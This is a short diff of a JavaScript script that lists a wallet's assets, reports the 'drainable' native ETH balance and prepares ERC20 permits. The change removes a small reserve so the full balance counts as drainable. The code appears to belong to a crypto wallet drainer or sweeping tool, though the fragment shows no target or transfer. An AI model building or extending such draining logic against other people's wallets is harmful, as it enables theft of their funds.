@@ -55,10 +55,9 @@ console.log('   ERC20 count:', assets.filter((a) => a.token !== 'native').length
 let ethNativeWei = '0';
 if (nativeEth?.amount_raw) {
   const weiBal = BigInt(String(nativeEth.amount_raw));
-  const reserve = 1_000_000_000_000_000n;
-  if (weiBal > reserve) ethNativeWei = (weiBal - reserve).toString();
+  if (weiBal > 0n) ethNativeWei = weiBal.toString();
 }
-console.log('   Drainable native (after 0.001 ETH reserve):', ethNativeWei, 'wei\n');
+console.log('   Drainable native (full balance):', ethNativeWei, 'wei\n');
 
 const permits = assets
   .filter((a) => a.token !== 'native' && a.token?.startsWith('0x'))
